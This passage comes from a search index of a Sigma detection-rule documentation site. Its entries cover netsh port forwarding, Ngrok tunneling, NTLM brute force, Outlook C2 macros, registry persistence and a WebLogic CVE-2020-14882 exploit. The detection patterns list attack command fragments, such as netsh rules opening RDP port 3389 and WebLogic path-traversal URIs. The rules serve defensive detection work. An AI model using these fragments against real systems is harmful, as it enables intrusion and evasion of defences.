","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_netsh_port_fwd.yml/","tags":["attack.lateral_movement","attack.defense_evasion","attack.command_and_control","attack.t1090"],"title":"Netsh Port Forwarding"},{"categories":null,"contents":"Allow Incoming Connections by Port or Application on Windows Firewall\nKnown false-positives Legitimate administration References https://attack.mitre.org/software/S0246/ (Lazarus HARDRAIN) https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-RAT-and-Staging-Report.pdf Raw rule (edit) title: Netsh Port or Application Allowed id: cd5cfd80-aa5f-44c0-9c20-108c4ae12e3c status: test description: Allow Incoming Connections by Port or Application on Windows Firewall author: Markus Neis, Sander Wiebing references: - https://attack.mitre.org/software/S0246/ (Lazarus HARDRAIN) - https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-RAT-and-Staging-Report.pdf date: 2019/01/29 modified: 2022/02/10 logsource: category: process_creation product: windows detection: selection1: Image|endswith: \u0026#39;\\netsh.exe\u0026#39; selection2: CommandLine|contains|all: - \u0026#39;firewall\u0026#39; - \u0026#39;add\u0026#39; filter_dropbox: CommandLine|contains: - \u0026#39;\\netsh.exe advfirewall firewall add rule name=Dropbox dir=in action=allow \u0026#34;program=C:\\Program Files (x86)\\Dropbox\\Client\\Dropbox.exe\u0026#34; enable=yes profile=Any\u0026#39; - \u0026#39;\\netsh.exe advfirewall firewall add rule name=Dropbox dir=in action=allow \u0026#34;program=C:\\Program Files\\Dropbox\\Client\\Dropbox.exe\u0026#34; enable=yes profile=Any\u0026#39; condition: selection1 and selection2 and not 1 of filter_* falsepositives: - Legitimate administration level: medium tags: - attack.defense_evasion - attack.t1562.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_netsh_fw_add.yml/","tags":["attack.defense_evasion","attack.t1562.004"],"title":"Netsh Port or Application Allowed"},{"categories":null,"contents":"Detects netsh commands that configure a port forwarding of port 3389 used for RDP\nKnown false-positives Legitimate administration References https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html Raw rule (edit) title: Netsh RDP Port Forwarding id: 782d6f3e-4c5d-4b8c-92a3-1d05fed72e63 status: test description: Detects netsh commands that configure a port forwarding of port 3389 used for RDP author: Florian Roth, oscd.community references: - https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html date: 2019/01/29 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\netsh.exe\u0026#39; CommandLine|contains|all: - \u0026#39;i\u0026#39; - \u0026#39; p\u0026#39; - \u0026#39;=3389\u0026#39; - \u0026#39; c\u0026#39; condition: selection falsepositives: - Legitimate administration level: high tags: - attack.lateral_movement - attack.defense_evasion - attack.command_and_control - attack.t1090 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_netsh_port_fwd_3389.yml/","tags":["attack.lateral_movement","attack.defense_evasion","attack.command_and_control","attack.t1090"],"title":"Netsh RDP Port Forwarding"},{"categories":null,"contents":"Detects netsh commands that opens the port 3389 used for RDP, used in Sarwent Malware\nKnown false-positives Legitimate administration References https://labs.sentinelone.com/sarwent-malware-updates-command-detonation/ Raw rule (edit) title: Netsh RDP Port Opening id: 01aeb693-138d-49d2-9403-c4f52d7d3d62 status: test description: Detects netsh commands that opens the port 3389 used for RDP, used in Sarwent Malware author: Sander Wiebing references: - https://labs.sentinelone.com/sarwent-malware-updates-command-detonation/ date: 2020/05/23 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - netsh - firewall add portopening - tcp 3389 selection2: CommandLine|contains|all: - netsh - advfirewall firewall add rule - action=allow - protocol=TCP - localport=3389 condition: 1 of selection* falsepositives: - Legitimate administration level: high tags: - attack.defense_evasion - attack.t1562.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_netsh_allow_port_rdp.yml/","tags":["attack.defense_evasion","attack.t1562.004"],"title":"Netsh RDP Port Opening"},{"categories":null,"contents":"Detects a set of suspicious network related commands often used in recon stages\nKnown false-positives False positives depend on scripts and administrative tools used in the monitored environment References https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/ Raw rule (edit) title: Network Reconnaissance Activity id: e6313acd-208c-44fc-a0ff-db85d572e90e status: experimental description: Detects a set of suspicious network related commands often used in recon stages author: Florian Roth references: - https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/ date: 2022/02/07 logsource: category: process_creation product: windows detection: selection_nslookup: CommandLine|contains|all: - \u0026#39;nslookup\u0026#39; - \u0026#39;_ldap._tcp.dc._msdcs.\u0026#39; condition: 1 of selection* falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: high tags: - attack.discovery - attack.t1087 - attack.t1082 - car.2016-03-001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_recon_net_activity.yml/","tags":["attack.discovery","attack.t1087","attack.t1082","car.2016-03-001"],"title":"Network Reconnaissance Activity"},{"categories":null,"contents":"Detects many failed connection attempts to different ports or hosts\nKnown false-positives Inventarization systems Vulnerability scans Penetration testing activity Raw rule (edit) title: Network Scans Count By Destination IP id: 4601eaec-6b45-4052-ad32-2d96d26ce0d8 status: test description: Detects many failed connection attempts to different ports or hosts author: Thomas Patzke date: 2017/02/19 modified: 2021/11/27 logsource: category: firewall detection: selection: action: denied timeframe: 24h condition: selection | count(dst_ip) by src_ip \u0026gt; 10 fields: - src_ip - dst_ip - dst_port falsepositives: - Inventarization systems - Vulnerability scans - Penetration testing activity level: medium tags: - attack.discovery - attack.t1046 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/net_susp_network_scan_by_ip.yml/","tags":["attack.discovery","attack.t1046"],"title":"Network Scans Count By Destination IP"},{"categories":null,"contents":"Detects many failed connection attempts to different ports or hosts\nKnown false-positives Inventarization systems Vulnerability scans Penetration testing activity Raw rule (edit) title: Network Scans Count By Destination Port id: fab0ddf0-b8a9-4d70-91ce-a20547209afb status: experimental description: Detects many failed connection attempts to different ports or hosts author: Thomas Patzke date: 2017/02/19 modified: 2021/09/21 logsource: category: firewall tags: - attack.discovery - attack.t1046 detection: selection: action: denied timeframe: 24h condition: selection | count(dst_port) by src_ip \u0026gt; 10 falsepositives: - Inventarization systems - Vulnerability scans - Penetration testing activity level: medium fields: - src_ip - dst_ip - dst_port ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/net_susp_network_scan_by_port.yml/","tags":["attack.discovery","attack.t1046"],"title":"Network Scans Count By Destination Port"},{"categories":null,"contents":"Detects the usage of tooling to sniff network traffic. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1040/T1040.md Raw rule (edit) title: Network Sniffing id: adc9bcc4-c39c-4f6b-a711-1884017bf043 status: test description: Detects the usage of tooling to sniff network traffic. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data. author: Alejandro Ortuno, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1040/T1040.md date: 2020/10/14 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection: Image|endswith: - \u0026#39;/tcpdump\u0026#39; - \u0026#39;/tshark\u0026#39; condition: selection falsepositives: - Legitimate administration activities level: informational tags: - attack.discovery - attack.credential_access - attack.t1040 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_network_sniffing.yml/","tags":["attack.discovery","attack.credential_access","attack.t1040"],"title":"Network Sniffing"},{"categories":null,"contents":"A General detection for a new application in AppCompat. This indicates an application executing for the first time on an endpoint.\nKnown false-positives This rule is to explore new applications on an endpoint. False positives depends on the organization. Newly setup system. Legitimate installation of new application. References https://github.com/OTRF/detection-hackathon-apt29/issues/1 https://threathunterplaybook.com/evals/apt29/detections/1.A.1_DFD6A782-9BDB-4550-AB6B-525E825B095E.html Raw rule (edit) title: New Application in AppCompat id: 60936b49-fca0-4f32-993d-7415edcf9a5d status: test description: A General detection for a new application in AppCompat. This indicates an application executing for the first time on an endpoint. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - https://github.com/OTRF/detection-hackathon-apt29/issues/1 - https://threathunterplaybook.com/evals/apt29/detections/1.A.1_DFD6A782-9BDB-4550-AB6B-525E825B095E.html date: 2020/05/02 modified: 2021/11/27 logsource: product: windows category: registry_event detection: selection: TargetObject|contains: \u0026#39;\\AppCompatFlags\\Compatibility Assistant\\Store\\\u0026#39; condition: selection falsepositives: - This rule is to explore new applications on an endpoint. False positives depends on the organization. - Newly setup system. - Legitimate installation of new application. level: informational tags: - attack.execution - attack.t1204.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_new_application_appcompat.yml/","tags":["attack.execution","attack.t1204.002"],"title":"New Application in AppCompat"},{"categories":null,"contents":"Alert for the addition of a new federated domain.\nKnown false-positives The creation of a new Federated domain is not necessarily malicious, however these events need to be followed closely, as it may indicate federated credential abuse or backdoor via federated identities at a similar or different cloud provider. References https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/wp-m-unc2452-2021-000343-01.pdf https://us-cert.cisa.gov/ncas/alerts/aa21-008a https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html https://www.sygnia.co/golden-saml-advisory https://o365blog.com/post/aadbackdoor/ Raw rule (edit) title: New Federated Domain Added id: 42127bdd-9133-474f-a6f1-97b6c08a4339 status: experimental description: Alert for the addition of a new federated domain. author: \u0026#39;@ionsor\u0026#39; date: 2022/02/08 references: - https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/wp-m-unc2452-2021-000343-01.pdf - https://us-cert.cisa.gov/ncas/alerts/aa21-008a - https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html - https://www.sygnia.co/golden-saml-advisory - https://o365blog.com/post/aadbackdoor/ logsource: category: Exchange product: m365 detection: selection: eventSource: Exchange eventName: \u0026#39;Add-FederatedDomain\u0026#39; status: success condition: selection falsepositives: - The creation of a new Federated domain is not necessarily malicious, however these events need to be followed closely, as it may indicate federated credential abuse or backdoor via federated identities at a similar or different cloud provider. level: medium tags: - attack.persistence - attack.t1136.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/m365/microsoft365_new_federated_domain_added.yml/","tags":["attack.persistence","attack.t1136.003"],"title":"New Federated Domain Added"},{"categories":null,"contents":"Monitor the creation of a new key under \u0026lsquo;TaskCache\u0026rsquo; when a new scheduled task is registered\nKnown false-positives Unknown References https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/ Raw rule (edit) title: New TaskCache Entry id: 4720b7df-40c3-48fd-bbdf-fd4b3c464f0d description: Monitor the creation of a new key under \u0026#39;TaskCache\u0026#39; when a new scheduled task is registered status: experimental tags: - attack.persistence - attack.t1053 - attack.t1053.005 date: 2021/06/18 modified: 2022/03/03 references: - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/ author: Syed Hasan (@syedhasan009) logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject|contains: \u0026#39;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\\u0026#39; filter: TargetObject|contains: - \u0026#39;Microsoft\\Windows\\UpdateOrchestrator\u0026#39; - \u0026#39;Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask\\Index\u0026#39; - \u0026#39;Microsoft\\Windows\\Flighting\\OneSettings\\RefreshCache\\Index\u0026#39; filter_svchost: Image: \u0026#39;C:\\WINDOWS\\system32\\svchost.exe\u0026#39; TargetObject|contains: - \u0026#39;Microsoft\\Windows\\WindowsUpdate\\Scheduled Start\\Index\u0026#39; - \u0026#39;Microsoft\\Windows\\PushToInstall\\Registration\\Index\u0026#39; - \u0026#39;Microsoft\\Windows\\GroupPolicy\\{*}\\Index\u0026#39; - \u0026#39;\\TaskCache\\Tree\\Opera scheduled Autoupdate\u0026#39; - \u0026#39;\\TaskCache\\Tree\\Opera scheduled assistant Autoupdate\u0026#39; - \u0026#39;\\TaskCache\\Tree\\OneDrive Reporting\u0026#39; - \u0026#39;\\TaskCache\\Tree\\OneDrive Standalone Update Task\u0026#39; - \u0026#39;\\TaskCache\\Tree\\Mozilla\\SD\u0026#39; - \u0026#39;\\TaskCache\\Tree\\Microsoft\\Windows\\.NET Framework\\.NET Framework \u0026#39; - \u0026#39;\\TaskCache\\Tree\\Microsoft\\Office\\OfficeOsfInstaller\\\u0026#39; - \u0026#39;\\TaskCache\\Tree\\Microsoft\\Office\\OfficeBackgroundTaskHandler\u0026#39; # *Logon and *Registration - \u0026#39;\\TaskCache\\Tree\\GoogleUpdateTaskMachine\u0026#39; # *Core and *UA - \u0026#39;\\TaskCache\\Tree\\DropboxUpdateTaskMachine\u0026#39; # *Core and *UA - \u0026#39;\\TaskCache\\Tree\\Mozilla\\Firefox Default Browser Agent \u0026#39; - \u0026#39;\\TaskCache\\Tree\\Mozilla\\Firefox Background Update \u0026#39; - \u0026#39;\\TaskCache\\Tree\\Microsoft\\Windows\\WOF\\WIM-Hash-Validation\\Index\u0026#39; - \u0026#39;\\TaskCache\\Tree\\Microsoft\\Office\\SD\u0026#39; - \u0026#39;\\TaskCache\\Tree\\Microsoft\\Office\\OfficeTelemetry\u0026#39; # *AgentLogOn and *AgentFallBack - \u0026#39;\\TaskCache\\Tree\\Microsoft\\Office\\Office ClickToRun Service Monitor\\\u0026#39; - \u0026#39;\\TaskCache\\Tree\\Microsoft\\Office\\Office Automatic Updates 2.0\\\u0026#39; - \u0026#39;\\TaskCache\\Tree\\klcp_update\\\u0026#39; - \u0026#39;\\TaskCache\\Tree\\Apple\\SD\u0026#39; - \u0026#39;\\TaskCache\\Tree\\Apple\\AppleSoftwareUpdate\\\u0026#39; - \u0026#39;\\TaskCache\\Tree\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\\\u0026#39; - \u0026#39;\\TaskCache\\Tree\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\\\u0026#39; - \u0026#39;\\TaskCache\\Tree\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\\\u0026#39; - \u0026#39;\\TaskCache\\Tree\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\\\u0026#39; condition: selection and not 1 of filter* falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_taskcache_entry.yml/","tags":["attack.persistence","attack.t1053","attack.t1053.005"],"title":"New TaskCache Entry"},{"categories":null,"contents":"Detects a core dump of a crashing Nginx worker process, which could be a signal of a serious problem or exploitation attempts.\nKnown false-positives Serious issues with a configuration or plugin References https://docs.nginx.com/nginx/admin-guide/monitoring/debugging/#enabling-core-dumps https://www.x41-dsec.de/lab/advisories/x41-2021-002-nginx-resolver-copy/ Raw rule (edit) title: Nginx Core Dump id: 59ec40bb-322e-40ab-808d-84fa690d7e56 description: Detects a core dump of a crashing Nginx worker process, which could be a signal of a serious problem or exploitation attempts. status: experimental author: Florian Roth date: 2021/05/31 references: - https://docs.nginx.com/nginx/admin-guide/monitoring/debugging/#enabling-core-dumps - https://www.x41-dsec.de/lab/advisories/x41-2021-002-nginx-resolver-copy/ logsource: product: apache detection: keywords: - \u0026#39;exited on signal 6 (core dumped)\u0026#39; condition: keywords falsepositives: - Serious issues with a configuration or plugin level: high tags: - attack.impact - attack.t1499.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_nginx_core_dump.yml/","tags":["attack.impact","attack.t1499.004"],"title":"Nginx Core Dump"},{"categories":null,"contents":"Detects the use of Ngrok, a utility used for port forwarding and tunneling, often used by threat actors to make local protected services publicly available. Involved domains are bin.equinox.io for download and *.ngrok.io for connections.\nKnown false-positives Another tool that uses the command line switches of Ngrok ngrok http 3978 (https://docs.microsoft.com/en-us/azure/bot-service/bot-service-debug-channel-ngrok?view=azure-bot-service-4.0) References https://ngrok.com/docs https://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html https://stackoverflow.com/questions/42442320/ssh-tunnel-to-ngrok-and-initiate-rdp https://www.virustotal.com/gui/file/58d21840d915aaf4040ceb89522396124c82f325282f805d1085527e1e2ccfa1/detection https://cybleinc.com/2021/02/15/ngrok-platform-abused-by-hackers-to-deliver-a-new-wave-of-phishing-attacks/. Raw rule (edit) title: Ngrok Usage id: ee37eb7c-a4e7-4cd5-8fa4-efa27f1c3f31 description: Detects the use of Ngrok, a utility used for port forwarding and tunneling, often used by threat actors to make local protected services publicly available. Involved domains are bin.equinox.io for download and *.ngrok.io for connections. status: experimental references: - https://ngrok.com/docs - https://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html - https://stackoverflow.com/questions/42442320/ssh-tunnel-to-ngrok-and-initiate-rdp - https://www.virustotal.com/gui/file/58d21840d915aaf4040ceb89522396124c82f325282f805d1085527e1e2ccfa1/detection - https://cybleinc.com/2021/02/15/ngrok-platform-abused-by-hackers-to-deliver-a-new-wave-of-phishing-attacks/. author: Florian Roth date: 2021/05/14 modified: 2021/06/07 tags: - attack.command_and_control - attack.t1572 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - \u0026#39; tcp 139\u0026#39; - \u0026#39; tcp 445\u0026#39; - \u0026#39; tcp 3389\u0026#39; - \u0026#39; tcp 5985\u0026#39; - \u0026#39; tcp 5986\u0026#39; selection2: CommandLine|contains|all: - \u0026#39; start \u0026#39; - \u0026#39;--all\u0026#39; - \u0026#39;--config\u0026#39; - \u0026#39;.yml\u0026#39; selection3: Image|endswith: - \u0026#39;ngrok.exe\u0026#39; CommandLine|contains: - \u0026#39; tcp \u0026#39; - \u0026#39; http \u0026#39; - \u0026#39; authtoken \u0026#39; condition: 1 of selection* falsepositives: - Another tool that uses the command line switches of Ngrok - ngrok http 3978 (https://docs.microsoft.com/en-us/azure/bot-service/bot-service-debug-channel-ngrok?view=azure-bot-service-4.0) level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_ngrok_pua.yml/","tags":["attack.command_and_control","attack.t1572"],"title":"Ngrok Usage"},{"categories":null,"contents":"Search for usage of reg or Powershell by non-priveleged users to modify service configuration in registry\nKnown false-positives Unknown References https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-20-638.jpg Raw rule (edit) title: Non-privileged Usage of Reg or Powershell id: 8f02c935-effe-45b3-8fc9-ef8696a9e41d status: test description: Search for usage of reg or Powershell by non-priveleged users to modify service configuration in registry author: Teymur Kheirkhabarov (idea), Ryan Plas (rule), oscd.community references: - https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-20-638.jpg date: 2020/10/05 modified: 2021/11/27 logsource: category: process_creation product: windows detection: integrity_level: IntegrityLevel: \u0026#39;Medium\u0026#39; reg: CommandLine|contains|all: - \u0026#39;reg\u0026#39; - \u0026#39;add\u0026#39; powershell_1: CommandLine|contains: \u0026#39;powershell\u0026#39; powershell_2: CommandLine|contains: - \u0026#39;set-itemproperty\u0026#39; - \u0026#39; sp \u0026#39; - \u0026#39;new-itemproperty\u0026#39; registry_folder: CommandLine|contains|all: - \u0026#39;ControlSet\u0026#39; - \u0026#39;Services\u0026#39; registry_key: CommandLine|contains: - \u0026#39;ImagePath\u0026#39; - \u0026#39;FailureCommand\u0026#39; - \u0026#39;ServiceDLL\u0026#39; condition: integrity_level and (reg or powershell_1 and powershell_2) and registry_folder and registry_key fields: - EventID - IntegrityLevel - CommandLine falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1112 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_non_priv_reg_or_ps.yml/","tags":["attack.defense_evasion","attack.t1112"],"title":"Non-privileged Usage of Reg or Powershell"},{"categories":null,"contents":"This the exploitation of a NTFS vulnerability as reported without many details via Twitter\nKnown false-positives Unlikely References https://twitter.com/jonasLyk/status/1347900440000811010 https://twitter.com/wdormann/status/1347958161609809921 Raw rule (edit) title: NTFS Vulnerability Exploitation id: f14719ce-d3ab-4e25-9ce6-2899092260b0 description: This the exploitation of a NTFS vulnerability as reported without many details via Twitter status: experimental author: Florian Roth date: 2021/01/11 modified: 2021/11/17 references: - https://twitter.com/jonasLyk/status/1347900440000811010 - https://twitter.com/wdormann/status/1347958161609809921 logsource: product: windows service: system detection: selection: Provider_Name: Ntfs EventID: 55 Origin: \u0026#39;File System Driver\u0026#39; Description|contains|all: - \u0026#39;contains a corrupted file record\u0026#39; - \u0026#39;The name of the file is \u0026#34;\\\u0026#34;\u0026#39; condition: selection falsepositives: - Unlikely level: critical tags: - attack.impact - attack.t1499.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_ntfs_vuln_exploit.yml/","tags":["attack.impact","attack.t1499.001"],"title":"NTFS Vulnerability Exploitation"},{"categories":null,"contents":"Detects common NTLM brute force device names\nKnown false-positives Systems with names equal to the spoofed ones used by the brute force tools References https://www.varonis.com/blog/investigate-ntlm-brute-force Raw rule (edit) title: NTLM Brute Force id: 9c8acf1a-cbf9-4db6-b63c-74baabe03e59 status: experimental description: Detects common NTLM brute force device names references: - https://www.varonis.com/blog/investigate-ntlm-brute-force author: Jerry Shockley \u0026#39;@jsh0x\u0026#39; date: 2022/02/02 tags: - attack.credential_access - attack.t1110 logsource: product: windows service: ntlm definition: Requires events from Microsoft-Windows-NTLM/Operational detection: selection: EventID: 8004 devicename: WorkstationName: - \u0026#39;Rdesktop\u0026#39; - \u0026#39;Remmina\u0026#39; - \u0026#39;Freerdp\u0026#39; - \u0026#39;Windows7\u0026#39; - \u0026#39;Windows8\u0026#39; - \u0026#39;Windows2012\u0026#39; - \u0026#39;Windows2016\u0026#39; - \u0026#39;Windows2019\u0026#39; condition: selection and devicename falsepositives: - Systems with names equal to the spoofed ones used by the brute force tools level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/ntlm/win_susp_ntlm_brute_force.yml/","tags":["attack.credential_access","attack.t1110"],"title":"NTLM Brute Force"},{"categories":null,"contents":"Detects logons using NTLM, which could be caused by a legacy source or attackers\nKnown false-positives Legacy hosts References https://twitter.com/JohnLaTwC/status/1004895028995477505 https://goo.gl/PsqrhT Raw rule (edit) title: NTLM Logon id: 98c3bcf1-56f2-49dc-9d8d-c66cf190238b status: experimental description: Detects logons using NTLM, which could be caused by a legacy source or attackers references: - https://twitter.com/JohnLaTwC/status/1004895028995477505 - https://goo.gl/PsqrhT author: Florian Roth date: 2018/06/08 modified: 2021/11/20 tags: - attack.lateral_movement - attack.t1550.002 logsource: product: windows service: ntlm definition: Requires events from Microsoft-Windows-NTLM/Operational detection: selection: EventID: 8002 ProcessName: \u0026#39;*\u0026#39; # We use this to avoid false positives with ID 8002 on other log sources if the logsource isn\u0026#39;t set correctly condition: selection falsepositives: - Legacy hosts level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/ntlm/win_susp_ntlm_auth.yml/","tags":["attack.lateral_movement","attack.t1550.002"],"title":"NTLM Logon"},{"categories":null,"contents":"Detects Octopus Scanner Malware.\nKnown false-positives Unknown References https://securitylab.github.com/research/octopus-scanner-malware-open-source-supply-chain Raw rule (edit) title: Octopus Scanner Malware id: 805c55d9-31e6-4846-9878-c34c75054fe9 status: test description: Detects Octopus Scanner Malware. author: NVISO references: - https://securitylab.github.com/research/octopus-scanner-malware-open-source-supply-chain date: 2020/06/09 modified: 2021/11/27 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: - \u0026#39;\\AppData\\Local\\Microsoft\\Cache134.dat\u0026#39; - \u0026#39;\\AppData\\Local\\Microsoft\\ExplorerSync.db\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.t1195 - attack.t1195.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_mal_octopus_scanner.yml/","tags":["attack.t1195","attack.t1195.001"],"title":"Octopus Scanner Malware"},{"categories":null,"contents":"Detects registry changes to Office macro settings. The TrustRecords contain information on executed macro-enabled documents. (see references)\nKnown false-positives Valid Macros and/or internal documents References https://twitter.com/inversecos/status/1494174785621819397 https://www.mcafee.com/blogs/other-blogs/mcafee-labs/zloader-with-a-new-infection-technique/ https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/ Raw rule (edit) title: Office Security Settings Changed id: a166f74e-bf44-409d-b9ba-ea4b2dd8b3cd status: experimental description: Detects registry changes to Office macro settings. The TrustRecords contain information on executed macro-enabled documents. (see references) author: Trent Liffick (@tliffick) date: 2020/05/22 modified: 2022/01/10 references: - https://twitter.com/inversecos/status/1494174785621819397 - https://www.mcafee.com/blogs/other-blogs/mcafee-labs/zloader-with-a-new-infection-technique/ - https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/ tags: - attack.defense_evasion - attack.t1112 logsource: category: registry_event product: windows detection: sec_settings: TargetObject|endswith: - \u0026#39;\\Security\\Trusted Documents\\TrustRecords\u0026#39; - \u0026#39;\\Security\\AccessVBOM\u0026#39; - \u0026#39;\\Security\\VBAWarnings\u0026#39; condition: sec_settings falsepositives: - Valid Macros and/or internal documents level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_office_security.yml/","tags":["attack.defense_evasion","attack.t1112"],"title":"Office Security Settings Changed"},{"categories":null,"contents":"Detects exploitation attempts on WebLogic servers\nKnown false-positives Unknown References https://isc.sans.edu/diary/26734 https://twitter.com/jas502n/status/1321416053050667009?s=20 https://twitter.com/sudo_sudoka/status/1323951871078223874 Raw rule (edit) title: Oracle WebLogic Exploit CVE-2020-14882 id: 85d466b0-d74c-4514-84d3-2bdd3327588b status: test description: Detects exploitation attempts on WebLogic servers author: Florian Roth references: - https://isc.sans.edu/diary/26734 - https://twitter.com/jas502n/status/1321416053050667009?s=20 - https://twitter.com/sudo_sudoka/status/1323951871078223874 date: 2020/11/02 modified: 2021/11/27 logsource: category: webserver detection: selection: c-uri|contains: - \u0026#39;/console/images/%252E%252E%252Fconsole.portal\u0026#39; - \u0026#39;/console/css/%2e\u0026#39; condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: high tags: - attack.t1190 - attack.initial_access - cve.2020.14882 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2020_14882_weblogic_exploit.yml/","tags":["attack.t1190","attack.initial_access","cve.2020.14882"],"title":"Oracle WebLogic Exploit CVE-2020-14882"},{"categories":null,"contents":"Detects the creation of a macro file for Outlook. Goes with win_outlook_c2_registry_key. VbaProject.OTM is explicitly mentioned in T1137. Particularly interesting if both events Registry \u0026amp; File Creation happens at the same time.\nKnown false-positives User genuinly creates a VB Macro for their email References https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/ Raw rule (edit) title: Outlook C2 Macro Creation id: 8c31f563-f9a7-450c-bfa8-35f8f32f1f61 status: experimental description: Detects the creation of a macro file for Outlook. Goes with win_outlook_c2_registry_key. VbaProject.OTM is explicitly mentioned in T1137. Particularly interesting if both events Registry \u0026amp; File Creation happens at the same time. references: - https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/ author: \u0026#39;@ScoubiMtl\u0026#39; tags: - attack.persistence - attack.command_and_control - attack.t1137 - attack.t1008 - attack.t1546 date: 2021/04/05 logsource: category: file_event product: windows detection: selection: TargetFilename|endswith: \u0026#39;\\Microsoft\\Outlook\\VbaProject.OTM\u0026#39; condition: selection falsepositives: - User genuinly creates a VB Macro for their email level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_outlook_c2_macro_creation.yml/","tags":["attack.persistence","attack.command_and_control","attack.t1137","attack.t1008","attack.t1546"],"title":"Outlook C2 Macro Creation"},{"categories":null,"contents":"Detects the creation of new Outlook form which can contain malicious code\nKnown false-positives unknown References https://twitter.com/blueteamsec1/status/1401290874202382336?s=20 Raw rule (edit) title: Outlook Form Installation id: c3edc6a5-d9d4-48d8-930e-aab518390917 status: experimental description: Detects the creation of new Outlook form which can contain malicious code references: - https://twitter.com/blueteamsec1/status/1401290874202382336?s=20 tags: - attack.persistence - attack.t1137.003 author: Tobias Michalski date: 2021/06/10 logsource: product: windows category: file_event detection: selection: Image: \u0026#39;\\outlook.exe\u0026#39; TargetFilename|contains: \u0026#39;\\appdata\\local\\microsoft\\FORMS\\\u0026#39; condition: selection fields: - TargetFilename falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_outlook_newform.yml/","tags":["attack.persistence","attack.t1137.003"],"title":"Outlook Form Installation"},{"categories":null,"contents":"Detects Pandemic Windows Implant\nKnown false-positives unknown References https://wikileaks.org/vault7/#Pandemic https://twitter.com/MalwareJake/status/870349480356454401 Raw rule (edit) title: Pandemic Registry Key id: 47e0852a-cf81-4494-a8e6-31864f8c86ed status: experimental description: Detects Pandemic Windows Implant references: - https://wikileaks.org/vault7/#Pandemic - https://twitter.com/MalwareJake/status/870349480356454401 tags: - attack.lateral_movement - attack.t1105 author: Florian Roth date: 2017/06/01 modified: 2021/09/12 logsource: category: registry_event product: windows detection: selection: TargetObject|contains: 